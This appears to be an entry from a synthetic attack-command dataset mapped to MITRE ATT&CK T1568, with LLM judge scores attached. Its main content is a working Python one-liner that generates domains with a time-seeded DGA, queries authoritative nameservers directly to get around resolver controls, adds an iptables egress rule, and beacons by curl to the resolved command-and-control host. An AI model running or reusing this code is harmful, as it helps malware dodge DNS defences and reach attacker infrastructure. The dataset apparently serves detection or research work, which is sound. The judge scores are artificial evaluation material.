@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import random,datetime,hashlib,subprocess; from scapy.all import IP,UDP,DNS,DNSQR,sr1\nseed='ns-pivot'; tlds=['com','net','org']\ndef dga(n):\n    base=str(datetime.datetime.utcnow().strftime('%Y%m%d%H'))+seed\n    return [hashlib.sha256((base+str(i)).encode()).hexdigest()[:10]+'.'+tlds[i%len(tlds)] for i in range(n)]\ndom=None; ns=None; ip=None; port=random.choice([8088,9443,20080])\nfor d in dga(25):\n    resp=sr1(IP(dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=d,qtype='NS')),timeout=3,verbose=0)\n    if resp and resp[DNS] and resp[DNS].an:\n        for rr in resp[DNS].an:\n            if getattr(rr,'type',0)==2:\n                ns=rr.rdata.rstrip('.') if isinstance(rr.rdata,str) else rr.rdata.decode().rstrip('.')\n                dom=d; break\n    if ns: break\nif ns:\n    r2=sr1(IP(dst='1.1.1.1')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=ns,qtype='A')),timeout=3,verbose=0)\n    if r2 and r2[DNS] and r2[DNS].an:\n        nsip=None\n        for a in r2[DNS].an:\n            if getattr(a,'type',0)==1:\n                nsip=a.rdata; break\n        if nsip:\n            r3=sr1(IP(dst=nsip)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=dom,qtype='A')),timeout=3,verbose=0)\n            if r3 and r3[DNS] and r3[DNS].an:\n                for a in r3[DNS].an:\n                    if getattr(a,'type',0)==1:\n                        ip=a.rdata; break\nif ip and dom:\n    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n    subprocess.run(['curl','-sS','--connect-timeout','3',f'http://{dom}:{port}/touch'])\n    print(dom,ip,port)\"",
+  "explanation": "Pivots to the authoritative NS for a DGA domain to resolve the final A record, helping bypass recursive resolver controls and enabling dynamic endpoint selection.",
+  "rationale_steps": [
+    "Identify NS records for a DGA domain with scapy.",
+    "Resolve the NS to an IP and query it directly for the A record.",
+    "Open a precise egress rule for the resolved IP and unusual port.",
+    "Beacon using curl to verify end-to-end connectivity."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1568-c17789a5-631f40b9",
+  "source_prompt_hash": "c17789a5",
+  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python code is well-formed with properly balanced quotes, parentheses, and braces, correct imports, valid function definitions, and proper control flow structures.",
+        "semantic_score": 5,
+        "semantic_justification": "The code perfectly implements a DGA (Domain Generation Algorithm) that creates time-based domains, queries for NS records, pivots through authoritative nameservers, and establishes command and control through discovered endpoints - directly aligning with T1568 Dynamic Resolution technique.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:33:09.638992Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python script is impeccably structured with balanced delimiters, valid module imports, proper function definitions, and correct use of Scapy and subprocess commands, making it perfectly well-formed.",
+        "semantic_score": 4,
+        "semantic_justification": "The command excellently implements DGA and an advanced authoritative NS pivot for dynamic resolution (T1568), aligning strongly with the claimed intent, though the final `iptables` command will fail due to requiring root privileges not available under the stated 'Privilege: None'.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T07:33:31.921705Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Multi-line Python in a single quoted -c string is well-formed with balanced quotes/parentheses and valid Scapy/subprocess invocations.",
+        "semantic_score": 3,
+        "semantic_justification": "Implements DGA-based domain generation and authoritative-NS pivot consistent with T1568, but likely fails operationally without root (Scapy raw sockets, iptables) and assumes pre-registered DGA domains while ignoring NS in the authority section.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T07:34:07.583858Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
